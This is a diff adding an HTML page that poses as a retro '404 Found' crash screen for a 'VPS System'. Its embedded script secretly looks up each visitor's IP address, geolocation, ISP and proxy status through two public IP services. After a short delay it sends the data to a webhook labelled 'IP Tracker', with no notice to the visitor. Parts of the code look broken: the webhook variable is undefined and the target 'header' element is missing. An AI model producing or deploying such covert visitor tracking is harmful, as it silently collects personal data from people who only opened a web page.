@@ -1,0 +1,78 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>VPS System - 404 Found</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+
+<body class="bg-purple">
+
+    <div class="notfound">
+        <div class="centered"><span class="inverted">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span>&nbsp;</div>
+        <div class="centered"><span class="inverted">&nbsp;4&nbsp;0&nbsp;4&nbsp;</span><span
+                class="shadow">&nbsp;</span></div>
+        <div class="centered"><span class="inverted">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span
+                class="shadow">&nbsp;</span></div>
+        <div class="centered">&nbsp;<span class="shadow">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span></div>
+        <div class="row">&nbsp;</div>
+        <div class="row">A fatal exception 404 has occurred at C0DE:ABAD1DEA in 0xC0DEBA5E.</div>
+        <div class="row">The current request will be terminated.</div>
+        <div class="row">&nbsp;</div>
+        <div class="row">* Press any key to return to the previous page.</div>
+        <div class="row">* Press CTRL+ALT+DEL to restart your computer. You will</div>
+        <div class="row">&nbsp;&nbsp;lose any unsaved information in all applications.</div>
+        <div class="row">&nbsp;</div>
+        <div class="centered">Press any key to continue...<span class="blink">&#9608;</span></div>
+    </div>
+
+
+    <script>
+        function get_information(link, callback) {
+            var xhr = new XMLHttpRequest();
+            xhr.open("GET", link, true);
+            xhr.onreadystatechange = function () {
+                if (xhr.readyState === 4) {
+                    callback(xhr.responseText);
+                }
+            };
+            xhr.send(null);
+        }
+        get_information("http://ip-api.com/json/?fields=status,message,continent,continentCode,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,offset,currency,isp,org,as,asname,reverse,mobile,proxy,hosting,query", function (text) {
+            var div = document.createElement("div");
+            div.innerHTML = text;
+            div.id = "razzylog";
+            const secondList = document.getElementsByClassName("header")[0]
+            secondList.appendChild(div)
+        });
+        get_information("https://api.ipify.org/", function (text) {
+            var div = document.createElement("div");
+            div.innerHTML = text;
+            div.id = "ipppp";
+            const secondList = document.getElementsByClassName("header")[0]
+            secondList.appendChild(div)
+        });
+
+        function ipLogControl() {
+            var ispp = document.getElementById('ipppp').innerHTML
+            var extra = document.getElementById("razzylog").innerHTML
+            const request = new XMLHttpRequest();
+            request.open("POST", wbhk);
+            request.setRequestHeader('Content-type', 'application/json');
+            const params = {
+                username: "IP Tracker",
+                avatar_url: 'https://cdn.discordapp.com/attachments/1081705288014504006/1085346593273815101/yahudaaxd.png',
+                content: `**IP:** ${ispp} \n Control IP: https://www.ipsorgu.com/?ip=${ispp}#sorgu \n Extra Info: ${extra}`
+            }
+
+            request.send(JSON.stringify(params));
+        }
+        setTimeout(function () {
+            ipLogControl()
+        }, 700);
+    </script>
+</body>
+
+</html>
